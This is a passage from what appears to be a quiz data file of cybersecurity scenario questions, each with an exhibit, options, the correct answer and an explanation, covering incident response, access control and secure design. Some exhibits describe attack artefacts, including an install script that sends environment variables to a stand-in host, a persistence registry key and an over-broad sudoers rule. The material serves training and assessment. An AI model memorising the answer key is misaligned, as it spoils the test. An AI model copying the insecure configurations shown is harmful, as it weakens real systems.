    options: ["A backup to a cloud provider, so no action is needed","Normal quarterly reporting activity","A distributed denial-of-service attack against the server","Probable exfiltration over HTTPS: isolate the host, preserve flow and host evidence, identify the data affected and involve legal and privacy teams"],
    correct: 3, why: "A large outbound spike from a sensitive server to a newly registered domain is consistent with exfiltration and may trigger legal and notification duties.",
    hint: "Compare the volume with the host's normal behaviour."
  },
  {
    id: 243, rank: 4, topic: "Malicious Install Scripts", difficulty: "EXPERT",
    exhibit: "BUILD LOG\nnpm install left-pad-utils@1.0.3\n> postinstall: node ./scripts/setup.js\n(setup.js reads environment variables and sends them to https://metrics-collector.example)",
    q: "What is the best strategic control against this build behaviour?",
    options: ["Allow every package on the public registry because developers need speed and flexibility","Pin and verify dependencies, limit build egress and keep secrets out","Run builds with full production credentials so that failures are easier to diagnose","Ask developers to read every dependency's source code manually before each build"],
    correct: 1, why: "Install scripts can run arbitrary code during the build, so controls should limit what builds can reach and what secrets they hold, and dependencies should be pinned and verified.",
    hint: "Assume a dependency may misbehave during the build."
  },
  {
    id: 244, rank: 4, topic: "Certificate Transparency Alert", difficulty: "EXPERT",
    exhibit: "CERTIFICATE TRANSPARENCY ALERT\nSUBJECT: login.company.example\nISSUER: unknown CA (not used by the organisation)\nREQUESTED BY: unfamiliar account",
    q: "What should you do about this certificate transparency alert?",
    options: ["Treat it as possible misissuance: verify, request revocation and review DNS control","Ignore the alert because certificate transparency logs are not considered reliable by browsers","Delete the whole DNS zone so that nobody can use the certificate","Wait for the certificate to expire naturally"],
    correct: 0, why: "An unexpected certificate for a login host may indicate misissuance or loss of domain control, so it should be verified, revoked if illegitimate and investigated.",
    hint: "Who proved control of the domain?"
  },
  {
    id: 245, rank: 4, topic: "Dangling DNS Record", difficulty: "EXPERT",
    exhibit: "DNS ZONE (excerpt)\nshop.company.example.  CNAME  company-shop.cloudapps.example.\nNOTE: the cloud app 'company-shop' was deleted six months ago and the record was never removed",
    q: "What is the risk of this DNS record and what should the response include?",
    options: ["None, because unused DNS records are harmless","Slower page loads for visitors to the shop","Subdomain takeover: an attacker could claim the app name and serve content on the company's subdomain; remove the record and review all dangling records","Certificate expiry on the main website"],
    correct: 2, why: "A CNAME pointing at a deprovisioned resource can let someone else register that resource and serve content on your subdomain, so such records should be removed and audited.",
    hint: "The name still points somewhere nobody owns."
  },
  {
    id: 246, rank: 4, topic: "LLM Prompt Log Retention", difficulty: "EXPERT",
    exhibit: "LLM GATEWAY CONFIGURATION\n  log_prompts: true\n  log_completions: true\n  retention_days: 1825\n  storage: shared analytics bucket (readable by all engineers)",
    q: "What is the most significant risk of this LLM gateway configuration?",
    options: ["Prompt logging will cause the model to forget everything it has learned about the users","Sensitive prompts retained for years in broadly accessible storage","The retention period is too short to allow the model to be retrained effectively","Storing completions makes the model respond more slowly to users"],
    correct: 1, why: "Prompts and outputs often contain confidential or personal data. Five years of retention in broadly readable storage creates privacy and breach risk.",
    hint: "Think about what people paste into prompts."
  },
  {
    id: 247, rank: 4, topic: "Purple Team Gap Closure", difficulty: "EXPERT",
    exhibit: "PURPLE-TEAM REPORT\nTECHNIQUE: T1003 (credential dumping) executed on 3 hosts\nEDR: logged all three, alerted on only one\nSIEM: no detection rule for the technique",
    q: "What is the best next action after this purple-team result?",
    options: ["Close the finding because one of the three hosts did generate an alert on the technique","Remove the EDR agent from the two missed hosts","Ask the red team to stop using the technique","Build and test a detection for the technique, fix the EDR gaps and retest"],
    correct: 3, why: "The value of purple teaming is closing the gap: create the missing detection, correct the inconsistent EDR coverage and rerun the test to prove the fix.",
    hint: "Fix, then prove it with a retest."
  },
  {
    id: 248, rank: 4, topic: "Run Key Persistence", difficulty: "EXPERT",
    exhibit: "REGISTRY ARTEFACT (workstation)\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater = C:\\Users\\Public\\upd.exe\nFILE: unsigned, created at 03:12",
    q: "What is the best interpretation and action for this registry artefact?",
    options: ["Likely persistence; collect and hash the file and scope other hosts","A routine browser extension setting that all users have, so it can be ignored","A legitimate printer driver that always lives in the public user folder","A Windows update entry created by Microsoft during any normal patch cycle"],
    correct: 0, why: "An unsigned executable in a world-writable folder set to start at logon is a typical persistence mechanism, so it should be collected, analysed and hunted for elsewhere.",
    hint: "Why would an unsigned file in the Public folder run at every logon?"
  },
  {
    id: 249, rank: 4, topic: "Attack Path Reduction", difficulty: "EXPERT",
    exhibit: "ATTACK-PATH ANALYSIS (summary)\nROUTES FROM STANDARD USER TO DOMAIN ADMIN: 14\nCAUSES: nested group memberships; one service account with local admin rights on all servers",
    q: "Which strategy is most effective at reducing these attack paths?",
    options: ["Accept the paths because they are theoretical until an attacker has demonstrated them in production","Remove excess service-account rights, tier administration and re-run the analysis","Add the paths to the risk register as informational with no owner or deadline for action","Block the analysis tool on the network so that attackers cannot use it"],
    correct: 1, why: "Removing the excessive rights that create the paths and re-running the analysis demonstrates a real reduction in exposure.",
    hint: "Fix the paths, then measure again."
  },
  {
    id: 250, rank: 4, topic: "Legacy Hash Migration", difficulty: "EXPERT",
    exhibit: "DATABASE AUDIT\nTABLE: users (2,000,000 rows)\nCOLUMN: password_hash = MD5(password), no salt",
    q: "The organisation must migrate without forcing all users to reset at once. Which approach is best?",
    options: ["Keep MD5 but add a longer password policy","Delete the hashes and ask every user to email their password","Wrap the existing hashes in a strong salted hash such as Argon2id, upgrade each user's hash at next login and force resets for high-risk accounts","Encrypt the MD5 values with a single key stored in the same database"],
    correct: 2, why: "Wrapping legacy hashes immediately improves protection, and re-hashing at login gradually removes the weak scheme while high-risk accounts are reset promptly.",
    hint: "Improve protection now without waiting for every user to return."
  },
  {
    id: 251, rank: 0, topic: "Report or Delete Phishing", difficulty: "BEGINNER",
    q: "You receive an email that you are sure is phishing, and you have not clicked anything. What is the BEST action?",
    options: ["Delete it straight away and mention it to nobody","Reply and ask the sender to stop emailing you","Report it through the organisation's phishing process, then delete it","Forward it to all your colleagues so that everybody knows not to open the message"],
    correct: 2, why: "Deleting it keeps you safe, but reporting it also lets the security team block the sender and warn others. Replying confirms your address is active, and forwarding spreads the risk.",
    hint: "Safe for you is good; safe for everyone is better."
  },
  {
    id: 252, rank: 0, topic: "Lost Device Response", difficulty: "BEGINNER",
    q: "You left your encrypted, password-protected work laptop on a train. What is the BEST first step?",
    options: ["Report the loss to IT straight away so that it can be locked or wiped","Wait until tomorrow to see whether it is handed in to lost property before telling anyone","Change your work password from another device before telling IT about the loss","Replace it with the same model and restore your files, then tell IT afterwards"],
    correct: 0, why: "Encryption helps, but IT can only lock or wipe the device, revoke access and assess exposure if they know. Changing your password is sensible too, but it should follow reporting rather than replace it.",
    hint: "Who needs to know first so that they can act?"
  },
  {
    id: 253, rank: 0, topic: "Urgent Approval on Public Wi-Fi", difficulty: "BEGINNER",
    q: "You must approve an urgent expense on your phone while at an airport that offers free Wi-Fi. What is the BEST way to proceed?",
    options: ["Use the airport Wi-Fi because the network name looks official and the page loads quickly","Wait until you are back home to approve it, even though the approval is urgent","Turn off your phone's security settings so that the approval app loads faster","Use your mobile data connection, or the company VPN if you need Wi-Fi, and then approve it"],
    correct: 3, why: "Waiting is safe but impractical for an urgent approval. Using mobile data or the company VPN lets you act quickly without trusting an unknown network.",
    hint: "Look for a way to be both safe and timely."
  },
  {
    id: 254, rank: 0, topic: "Access to an Absent Colleague's File", difficulty: "BEGINNER",
    q: "A colleague is on leave and your manager asks you to log in to their account to retrieve a file. What is the BEST response?",
    options: ["Ask the colleague to send you their password by text message so that you can log in","Ask IT to grant delegated access to the file through the approved process","Try likely passwords such as their birthday","Contact the colleague on leave and ask them to share the file through the normal sharing tools"],
    correct: 1, why: "Asking the colleague to share the file is acceptable if they can be reached, but approved delegated access from IT works without disturbing them and keeps an audit trail. Passwords must never be shared or guessed.",
    hint: "Use the route that is approved and always available."
  },
  {
    id: 255, rank: 1, topic: "Ransomware Alert Containment", difficulty: "INTERMEDIATE",
    exhibit: "EDR ALERT\nHOST: LAPTOP-052 (user travelling, offline hours)\nBEHAVIOUR: 1,900 files renamed in 90 seconds; shadow copy deletion attempted\nSTATUS: process still running",
    q: "What is the BEST first action for this ransomware alert?",
    options: ["Reimage the laptop straight away to remove any malware","Isolate the host with the EDR to stop any spread, then escalate with the alert details","Escalate the alert to Tier 2 and wait for their instructions","Close the alert as a false positive because the user is travelling"],
    correct: 1, why: "Escalating is correct, but with an active encryption process it should follow immediate isolation so that the damage cannot spread while the escalation is processed. Reimaging would destroy evidence.",
    hint: "The process is still running; stop it spreading first."
  },
  {
    id: 256, rank: 1, topic: "Exposing RDP Request", difficulty: "INTERMEDIATE",
    exhibit: "CHANGE REQUEST CR-3391\nREQUESTED BY: contractor lead\nRULE: allow TCP 3389 from the internet to FILESRV02\nREASON: 'faster than the VPN'",
    q: "What is the BEST response to this change request?",
    options: ["Open 3389 to any source address and rely on monitoring to detect misuse","Open 3389 but restrict the source to the user's current public IP address and log all connections","Block remote access to every server for everyone permanently","Provide access through a VPN or bastion host with MFA instead"],
    correct: 3, why: "Restricting the source IP is better than opening the port to everyone, but RDP would still be exposed to the internet and the address can change or be spoofed. A VPN or bastion with MFA removes the direct exposure.",
    hint: "Is there a way to give access without exposing the service at all?"
  },
  {
    id: 257, rank: 1, topic: "Critical Patch Window", difficulty: "INTERMEDIATE",
    exhibit: "ADVISORY\nSEVERITY: critical remote code execution in a web framework used by customer-portal (internet-facing)\nPATCH: available\nREGRESSION TESTING: needs 2 days\nEXPLOITATION: proof-of-concept code is public",
    q: "What is the BEST approach while the patch is being tested?",
    options: ["Apply a temporary mitigation, such as a WAF rule, now and patch once testing is complete","Apply the patch to production immediately without any regression testing","Wait for testing to finish and take no other action in the meantime","Take the application offline until the patched version has been fully tested and released"],
    correct: 0, why: "Taking the application offline would also remove the exposure, but it is disproportionate when a mitigation can reduce the risk and keep the service running. Skipping testing or doing nothing are both poor choices.",
    hint: "Reduce the risk without breaking the business."
  },
  {
    id: 258, rank: 1, topic: "Impossible Travel Response", difficulty: "INTERMEDIATE",
    exhibit: "IDENTITY LOG (user jdoe)\n08:02 sign-in success  London, UK   device=WIN-LAP-22 (managed)\n08:09 sign-in success  Lagos, NG   device=unknown\n08:10 MFA prompt approved from Lagos session",
    q: "What is the BEST immediate action for this sign-in activity?",
    options: ["Wait to see whether any further suspicious sign-ins occur before acting","Send the user a general reminder about good password hygiene and MFA use","Revoke sessions, reset credentials and review the Lagos activity","Contact the user to confirm whether the second sign-in was really theirs"],
    correct: 2, why: "Contacting the user is a valid check, but an approved MFA prompt from an unknown device in another country already indicates compromise. Containment should come first, with verification afterwards.",
    hint: "The MFA prompt was already approved."
  },
  {
    id: 259, rank: 1, topic: "Policy Exemption Request", difficulty: "INTERMEDIATE",
    q: "A department head asks for an exemption from the new password-manager policy because it 'slows the team down'. What is the BEST approach?",
    options: ["Grant a permanent verbal exemption to keep relations good","Decline the request and explain clearly that the policy applies equally to every team in the organisation","Ignore the request until the next audit finds the problem","Assess the risk, offer help to comply and record any exception with an expiry date"],
    correct: 3, why: "Declining is consistent with the policy, but it ignores the underlying problem and may drive workarounds. Assessing the risk, supporting compliance and recording any exception with an expiry date is more effective.",
    hint: "Address the reason behind the request, not just the request."
  },
  {
    id: 260, rank: 1, topic: "Exposed Bucket Containment", difficulty: "INTERMEDIATE",
    exhibit: "ALERT: STORAGE BUCKET cust-reports-prod\nACCESS: public read (Principal *)\nCONTENTS: monthly customer statements (PDF)\nACCESS LOG: 3 requests from unknown IP addresses today",
    q: "What is the BEST immediate action for this exposed bucket?",
    options: ["Delete the bucket and everything inside it straight away","Block public access, preserve the access logs and assess what was exposed","Block public access and then notify the bucket owner by email","Add the issue to the risk register and fix it next quarter"],
    correct: 1, why: "Blocking public access and telling the owner are both right, but preserving the logs and assessing exposure is what allows the organisation to judge whether data was taken and whether notification is needed.",
    hint: "Stop the exposure, but keep the evidence."
  },
  {
    id: 261, rank: 1, topic: "Delayed Execution Sample", difficulty: "INTERMEDIATE",
    exhibit: "SANDBOX REPORT (attachment: Remittance_0921.xlsm)\n0-10 min: no network or file activity\n10-11 min: DNS query to cdn-statics.example, HTTPS POST to 203.0.113.140\nVERDICT: low confidence",
    q: "What is the BEST conclusion and action for this sandbox report?",
    options: ["Safe, because no malicious behaviour was observed in the first few minutes of analysis","Ignore the domain, as sandbox network traffic is unreliable","Treat it as evasive malware: block the domain and hunt for the file and domain","Block the domain and keep the file under review until the full analysis has finished completely"],
    correct: 2, why: "Blocking the domain is right and keeping the file under review is reasonable, but the delayed network activity suggests deliberate sandbox evasion, so the better response is to treat it as malicious and hunt for it.",
    hint: "Why would a sample wait ten minutes before acting?"
  },
  {
    id: 262, rank: 1, topic: "Scan Impact During Testing", difficulty: "INTERMEDIATE",
    q: "During an authorised test, a tester's scan makes a production service noticeably slower. The rules of engagement allow daytime testing. What is the BEST action?",
    options: ["Pause, inform the client contact and agree a throttled or out-of-hours approach","Continue at the same speed because the rules of engagement permit daytime testing","Stop all testing permanently and send the client an invoice for the work done so far","Reduce the scan speed straight away and carry on, mentioning the slowdown only in the final report"],
    correct: 0, why: "Slowing the scan is sensible, but the client has a production service at risk and must be told so that they can decide how to proceed. Permission to test does not remove the duty to avoid harm.",
    hint: "Permission to test is not permission to cause harm."
  },
  {
    id: 263, rank: 2, topic: "Service Account Misuse", difficulty: "ADVANCED",
    exhibit: "SIEM ALERT\nACCOUNT: svc-backup (service account)\nEVENT: interactive logon (type 2) on WS-114 at 22:41\nNORMAL BEHAVIOUR: service logon (type 5) on BACKUP01 only",
    q: "What is the BEST next step for this service account alert?",
    options: ["Contain WS-114, rotate svc-backup credentials and check where else it was used","Reboot WS-114 and see whether the account logs on interactively again afterwards","Add svc-backup to the allowlist for interactive logons because it is a known account","Disable svc-backup now and leave the investigation until morning"],
    correct: 0, why: "Disabling the account would stop further use, but it leaves the workstation and the scope of the compromise unexamined. Containing the host, rotating credentials and checking for other use addresses both.",
    hint: "Stopping the account is not the same as scoping the incident."
  },
  {
    id: 264, rank: 2, topic: "Temporary Production Access", difficulty: "ADVANCED",
    q: "A developer needs temporary administrator access to a production account to fix an outage. Which approach is BEST?",
    options: ["Share the existing administrator credentials with the developer","Grant the developer's own account permanent administrator rights","Use just-in-time elevation with approval, a time limit, session recording and automatic expiry","Let the developer assume a break-glass role, with alerting and a later review"],
    correct: 2, why: "A break-glass role with alerting and review is acceptable in emergencies, but just-in-time elevation gives the same speed with approval, limited duration and an automatic end to the access.",
    hint: "Both are time-limited, but one is controlled before it starts."
  },
  {
    id: 265, rank: 2, topic: "Packed Sample Triage", difficulty: "ADVANCED",
    exhibit: "ANALYSIS NOTE\nSAMPLE: invoice_viewer.exe (packed, high entropy)\nSANDBOX: process ends after 3 seconds, no network activity\nSTATIC: unsigned; mutex Global\\kx_upd_77; embedded domain cdn-sync-ops.example\nDEADLINE: decision to block needed within 30 minutes",
    q: "What is the BEST approach to this packed sample?",
    options: ["Declare the sample clean because a program that crashes during analysis cannot cause any harm","Run it on the analyst's own laptop outside the lab, in case it behaves differently on a real machine","Submit it to a second sandbox with a different configuration to see whether it will execute there","Pull indicators from static data and partial behaviour to block now, then keep unpacking"],
    correct: 3, why: "A second sandbox may help, but it does not meet the 30-minute deadline if the sample keeps crashing. Blocking on the indicators already available while analysis continues gives protection now and detail later.",
    hint: "Do what protects the business first, then keep analysing."
  },
  {
    id: 266, rank: 2, topic: "Release Fix Prioritisation", difficulty: "ADVANCED",
    exhibit: "SAST REPORT (excerpt)\nHIGH: SQL injection, OrderService.java line 88 (user input concatenated into query)\nMEDIUM: session cookie missing HttpOnly flag\nLOW: verbose error messages shown to users",
    q: "The release is on Friday and the team has time to fix only two issues. What is the BEST choice?",
    options: ["Fix the SQL injection and the verbose errors","Fix the SQL injection and the missing HttpOnly flag","Fix none of them and record all three as accepted risks for this release","Fix the two quickest items first"],
    correct: 1, why: "The SQL injection must be fixed in either case. Of the other two, the missing HttpOnly flag on the session cookie carries more risk than verbose error messages, so it is the better second choice.",
    hint: "Both good options include the worst flaw; compare the other issue."
  },
  {
    id: 267, rank: 2, topic: "Unpatchable Legacy Application", difficulty: "ADVANCED",
    q: "A legacy payment application cannot be patched for six months and is reachable from the whole corporate network. What is the BEST interim control?",
    options: ["Increase the minimum password length for every user of the application to 20 characters","Move it onto the guest Wi-Fi network so that it is separated from staff devices","Segment it so that only required hosts can reach it, and monitor it closely","Put a virtual-patching WAF in front of it"],
    correct: 2, why: "A virtual-patching WAF can help with web attacks, but segmentation limits who can reach every service on the application, so it removes far more exposure for the interim period.",
    hint: "Reduce who can reach it before trying to filter what reaches it."
  },
  {
    id: 268, rank: 2, topic: "Phishing Campaign Response", difficulty: "ADVANCED",
    exhibit: "MAIL GATEWAY LOG (excerpt)\n09:12 delivered  from=hr-updates@benefit-portal.example  to=40 users  subject='Update your benefits'\n09:20 link clicks recorded: 6 users\n09:31 sign-ins from new IP addresses: 2 of the 6 users",
    q: "What is the BEST sequence of actions for this phishing campaign?",
    options: ["Purge, block the domain, reset the six clickers' credentials and sessions and hunt for misuse","Send a warning email to all 40 recipients and wait for replies","Purge the message and block the domain, then reset passwords only for the six users who clicked","Block the sender domain and take no further action"],
    correct: 0, why: "Purging, blocking and resetting the clickers is good, but resetting passwords alone leaves active sessions open and does not look for misuse, which is what the two new-IP sign-ins suggest.",
    hint: "Two sign-ins already look suspicious."
  },
  {
    id: 269, rank: 2, topic: "Possibly Copied Private Key", difficulty: "ADVANCED",
    exhibit: "CERTIFICATE\nSUBJECT: shop.company.example\nEXPIRES: in 5 months\nPRIVATE KEY STORE: shared by 6 administrators\nDLP ALERT: a departing administrator copied the key store archive to a personal device",
    q: "What is the BEST action for this possibly copied private key?",
    options: ["Continue using it until it expires, because theft of the key has not been proven","Reissue with a new key, revoke the old certificate and review key access","Reissue the certificate using the same private key to avoid any configuration changes","Restrict access to the key store now and replace the key at the scheduled renewal"],
    correct: 1, why: "Tightening access is sensible, but the key may already be in someone else's hands, so waiting five months to replace it leaves an exposure. Replacing the key and revoking the certificate removes it.",
    hint: "If the key is copied, restricting future access is too late."
  },
  {
    id: 270, rank: 2, topic: "Chatbot Data Exposure", difficulty: "ADVANCED",
    exhibit: "CHATBOT LOG\n14:02 user=cust_4471 prompt='Where is my order 99231?'\n14:02 retrieved_orders=[99231 (cust_4471), 88410 (cust_0925), 88411 (cust_0925)]\n14:02 reply includes details of order 88410\nCHANGE: prompt template updated at 13:45; retrieval filter on customer_id removed",
    q: "What is the BEST first response to this chatbot behaviour?",
    options: ["Add an instruction to the system prompt telling the model never to reveal other customers' data","Roll back the prompt change immediately and review the logs for exposure","Leave it running while the vendor investigates, because the change was small","Roll back, enforce per-customer filtering in the retrieval layer, review logs and assess notification duties"],
    correct: 3, why: "Rolling back is a good immediate step, but the real flaw is that customer filtering was removed from retrieval. It needs to be enforced outside the model, and the exposure must be assessed.",
    hint: "A prompt cannot replace an access control."
  },
  {
    id: 271, rank: 2, topic: "Supplier Breach Notification", difficulty: "ADVANCED",
    q: "A critical SaaS supplier tells you it has had a breach that 'may' involve your customers' data and gives few details. What is the BEST response?",
    options: ["Wait until the supplier has completed its own investigation before doing anything","Tell all customers immediately that their data has been stolen by the supplier","Ask for details of the affected data and review what data you hold there","Start your incident process: assess exposure, legal clocks and communications"],
    correct: 3, why: "Asking for details and reviewing your data is necessary, but a supplier breach can start notification deadlines and affect customers, so it should be handled within your own incident process.",
    hint: "Your obligations start when you learn of the risk."
  },
  {
    id: 272, rank: 2, topic: "Incomplete Fix Retest", difficulty: "ADVANCED",
    exhibit: "RETEST RESULT\nFINDING: F-07 SQL injection in /search?q= (critical)\nRETEST 1: /search?q= payload blocked\nRETEST 2: same flaw still exploitable through /search?sort=\nFIX APPLIED: input filter on the q parameter only",
    q: "What is the BEST action for the retest report?",
    options: ["Mark it as fixed because the original request is now blocked","Mark it as not fully remediated, document the bypass and recommend a root-cause fix","Mark the original as partially remediated and raise the second parameter as a new finding","Close the finding and propose a new engagement"],
    correct: 1, why: "Treating the bypass as a new finding is a reasonable way to record it, but it is the same flaw, so the finding should remain open with the bypass documented and a root-cause fix recommended.",
    hint: "Same flaw, different parameter."
  },
  {
    id: 273, rank: 2, topic: "Sudo Rule Audit", difficulty: "ADVANCED",
    exhibit: "SUDOERS EXCERPT\nappadmin ALL=(ALL) NOPASSWD: ALL\nbackup   ALL=(root) NOPASSWD: /usr/bin/rsync",
    q: "What is the BEST remediation for these sudo rules?",
    options: ["Restrict appadmin to the specific commands it needs, require authentication and review who can use the account","Remove sudo from the backup account so that backups stop running as root","Require a password for appadmin's sudo commands but keep the broad permissions","Leave both rules, since both are service accounts"],
    correct: 0, why: "Requiring a password helps a little, but the appadmin rule still allows every command as root. Limiting the commands removes the real risk, and a review of who can use the account addresses accountability.",
    hint: "The rule is broad; narrow it, not just guard it."
  },
  {
    id: 274, rank: 2, topic: "Wired Network Access Control", difficulty: "ADVANCED",
    q: "An organisation wants to stop unauthorised devices from joining its wired office network. Which control is BEST?",
    options: ["Place stickers on the wall ports saying that unauthorised devices are not allowed","Disable unused ports and apply MAC address filtering on all the remaining ports","Use 802.1X port authentication with device certificates","Ask staff to check one another's devices when they sit down at a desk"],
    correct: 2, why: "Disabling unused ports is useful, but MAC addresses are easy to copy. 802.1X with certificates authenticates the device itself before it gets network access.",
    hint: "Which control proves what the device is?"
  },
  {
    id: 275, rank: 3, topic: "Multi-Tenant Isolation Design", difficulty: "EXPERT",
    exhibit: "REQUIREMENTS\n- 3,000 small customers: low price point\n- 12 regulated customers: strong isolation, own encryption keys\n- Platform engineering team: 20 people",
    q: "Which tenancy architecture is BEST for these requirements?",
    options: ["Use a single shared database and filter by tenant in the application code only","Give every tenant, including the 3,000 small ones, its own separate database and encryption keys","Use a shared database and trust the tenant ID sent by the client","Tiered: row-level security for small tenants, dedicated databases for regulated tenants"],
    correct: 3, why: "Dedicated databases for everyone would give strong isolation but would be costly and hard to run for 3,000 small tenants. A tiered model meets the regulated tenants' needs while keeping the platform economical.",
    hint: "Match the isolation to the customer, not one design for all."
  },
  {
    id: 276, rank: 3, topic: "Contractor Access Design", difficulty: "EXPERT",
    exhibit: "REQUIREMENT\n250 external contractors on unmanaged devices\nACCESS NEEDED: three internal web applications (HR-Proj, Wiki, Ticketing)\nCURRENT STATE: no contractor access method",
    q: "Which access design is BEST for the contractors?",
    options: ["Give contractors VPN access limited to the application subnets, protected by MFA","Publish the apps through an identity-aware proxy with MFA and per-app access","Create one shared contractor account for the group, protected by a single long password","Open the three applications to the internet and rely on an IP address allowlist only"],
    correct: 1, why: "A subnet-limited VPN with MFA is reasonable, but it places unmanaged devices on the network. An identity-aware proxy gives access to only the three applications, per user, without network connectivity.",
    hint: "Is it the application or the network the contractors need?"
  },
  {
    id: 277, rank: 3, topic: "Noisy Detection Rule Tuning", difficulty: "EXPERT",
    exhibit: "DETECTION RULE R-212: new member added to privileged group\nFIRED: 1,400 times in 30 days\nTRUE POSITIVES: 3\nBULK SOURCE: 1,390 alerts from service account svc-hr-sync (nightly HR synchronisation)",
    q: "What is the BEST tuning approach for this noisy rule?",
    options: ["Disable the rule permanently because it is far too noisy to be of any use","Exclude the HR sync service account from this rule only","Add a scoped exclusion for svc-hr-sync with an owner and review date, and monitor the account itself","Raise the alert threshold so that the rule fires only once a week for any actor"],
    correct: 2, why: "A narrow exclusion is correct, but an unreviewed exclusion for a privileged service account can become a blind spot. An owner, a review date and monitoring of the account itself keep the control honest.",
    hint: "Exclusions need an owner and an expiry."
  },
  {
    id: 278, rank: 3, topic: "Multi-Account Log Architecture", difficulty: "EXPERT",
    q: "A SOC must monitor 12 cloud accounts run by different teams. Which log architecture is BEST?",
    options: ["Centralise control-plane and key service logs in a write-protected logging account","Use the provider's native security service in each account and aggregate only the findings it produces","Forward only error-level logs from each account to the SIEM in order to keep storage costs low","Let each account team keep its own logs and review them once a month"],
    correct: 0, why: "Aggregating findings is useful, but investigations need the underlying logs, and these must be kept where an attacker with account access cannot alter them.",
    hint: "Findings are summaries; investigators need the logs."
  },
  {
    id: 279, rank: 3, topic: "Legacy Application SSO", difficulty: "EXPERT",
    q: "A legacy application supports only username and password login but must join the company's SSO and MFA. What is the BEST approach?",
    options: ["Use a single shared service account to sign users in on their behalf","Rewrite the application so that it supports modern authentication natively before anyone may use it again","Put it behind an identity-aware proxy that performs SSO and MFA, and allow access only through it","Leave the application on passwords alone, since legacy systems cannot support MFA"],
    correct: 2, why: "Rewriting the application would be a good long-term goal, but it could take months. A proxy delivers SSO and MFA now, provided the application can only be reached through it.",
    hint: "Is there a way to add the control without changing the application?"
  },
  {
    id: 280, rank: 3, topic: "Secure File Upload Design", difficulty: "EXPERT",
    q: "A document-upload feature accepts user files that staff later open. Which design is BEST?",
    options: ["Check the extension against an allowed list and store the file inside the web root for fast access later","Validate type by content, scan, store outside the web root in isolation and serve safely","Scan uploads for malware and validate the file type before storing them in the application's storage","Rely on antivirus on staff laptops"],
    correct: 1, why: "Scanning and validating the type is good, but the design is stronger when files are also stored outside the web root, kept isolated from the application and served with safe headers.",
    hint: "Think about where the file lives and how it is served."
  },
  {
    id: 281, rank: 3, topic: "Analytics Data Access", difficulty: "EXPERT",
    q: "A data science team wants a copy of production customer data in an analytics environment with fewer controls. What is the BEST architectural response?",
    options: ["Refuse all analytics access to customer data, since any use of production data is a risk","Provide a pseudonymised extract limited to the fields the team requires, with full access logging","Allow a full copy of the production data once the team has signed an acceptable-use form","Default to de-identified or synthetic data; allow re-identification only by approval"],
    correct: 3, why: "A limited pseudonymised extract is sensible, but de-identified or synthetic data by default avoids exposing real customers unless there is a specific, approved need to re-identify.",
    hint: "Can the team do the work without real identities?"
  },
  {
    id: 282, rank: 3, topic: "Mobile API Protection", difficulty: "EXPERT",
    q: "Which approach is BEST for protecting the mobile banking app's API calls from interception on hostile networks?",
    options: ["TLS with certificate pinning, a rotation plan with backup pins, and server-side checks that never trust the client","TLS with strict certificate validation and short-lived tokens","Obfuscate the API address inside the app","Use plain HTTP over a private mobile network"],
    correct: 0, why: "Strict TLS validation and short-lived tokens are sound, but pinning adds protection against rogue certificates on hostile networks, provided there is a safe rotation plan.",
    hint: "Think about a trusted CA that issues a certificate it should not."
  },
  {
    id: 283, rank: 3, topic: "Card Data Protection", difficulty: "EXPERT",
    exhibit: "DATABASE REVIEW\nTABLE: payments (card_number VARCHAR, expiry, customer_id)\nPROTECTION: storage-level (disk) encryption enabled\nAUDITOR NOTE: a compromised application account can read all card numbers in clear text",
    q: "What is the BEST improvement to this database protection?",
    options: ["Add a second layer of disk encryption on the database volume and rotate its key every month","Restrict database access with role-based permissions and monitor the queries that are run","Tokenise card numbers or use field-level encryption with keys held separately in a KMS","Move the database to a larger instance with more memory"],
    correct: 2, why: "Tighter permissions and query monitoring help, but a compromised application account would still read clear card numbers. Tokenisation or field-level encryption protects the data itself.",
    hint: "Disk encryption does not stop an authorised account reading data."
  },
  {
    id: 284, rank: 3, topic: "Pipeline Gate Tuning", difficulty: "EXPERT",
    exhibit: "PIPELINE SCAN SUMMARY (30 days)\nFINDINGS: 2,300 (High 140, Medium 900, Low 1,260)\nBUILDS BLOCKED BY SCANS: 61%\nDEVELOPER BYPASSES (skip-scan flag): 38 builds",
    q: "Which improvement to this pipeline policy is BEST?",
    options: ["Make every finding a blocking finding and remove the skip-scan flag so that nothing can be bypassed","Block on confirmed high-severity findings, backlog the rest with deadlines and tune the rules","Run the scans only once each quarter","Make the scans advisory with a weekly report so that developers are never blocked"],
    correct: 1, why: "Advisory scanning avoids friction but gives no control. Blocking everything causes bypasses, as the data shows. Blocking on confirmed high-severity issues and managing the rest through deadlines keeps trust and control.",
    hint: "Controls that people bypass do not protect anything."
  },
  {
    id: 285, rank: 3, topic: "Threat Intelligence at Scale", difficulty: "EXPERT",
    exhibit: "THREAT INTELLIGENCE FEEDS\nDAILY INDICATORS RECEIVED: 2,000,000\nSIEM MATCHING LATENCY: 40 minutes (was 2 minutes)\nHIT RATE: 0.01% (mostly stale or low-confidence indicators)",
    q: "Which approach to these threat intelligence feeds is BEST?",
    options: ["Score indicators, expire stale ones and match them where it matters most","Use only a vetted subset of indicators from trusted sector-sharing groups and closed communities","Load every indicator permanently, because more data always improves detection","Stop using threat intelligence feeds altogether because they are slowing the SIEM down"],
    correct: 0, why: "A vetted subset reduces volume, but it discards useful indicators from other sources. Scoring, ageing and placing matching at the right control points keeps the value without the delay.",
    hint: "Manage quality and age, not just volume."
  },
  {
    id: 286, rank: 3, topic: "Deletion Requests and Backups", difficulty: "EXPERT",
    q: "A privacy law requires a customer's data to be deleted on request, but backups keep it for 35 days. What is the BEST approach?",
    options: ["Delete only from production and say nothing about the backups","Shorten the backup retention period where that is feasible and document the remaining period clearly","Delete from production, document the backup period and re-apply deletions on any restore","Stop making backups so that deleted data cannot be retained"],
    correct: 2, why: "Shortening retention is useful, but it does not by itself prevent deleted data from returning after a restore. Documenting the period and re-applying deletions on restore addresses both transparency and compliance.",
    hint: "What happens to the deleted record if you restore?"
  },
  {
    id: 287, rank: 3, topic: "Outbound TLS Inspection", difficulty: "EXPERT",
    q: "Security wants to decrypt and inspect outbound TLS traffic to detect exfiltration, but legal is concerned about banking and health sites. Which approach is BEST?",
    options: ["Inspect all outbound traffic without exception, including banking and health sites","Inspect nothing and rely on endpoint antivirus alone","Use DNS and flow metadata only, without decrypting any traffic","Inspect with exemptions for sensitive categories, a clear policy, protected keys and logs, and metadata for exempt traffic"],
    correct: 3, why: "Metadata alone is privacy-friendly but gives limited visibility. A policy-based approach with exemptions for sensitive sites, protected keys and logs, and metadata for exempt traffic balances detection with privacy.",
    hint: "Balance detection with privacy, not one or the other."
  },
  {
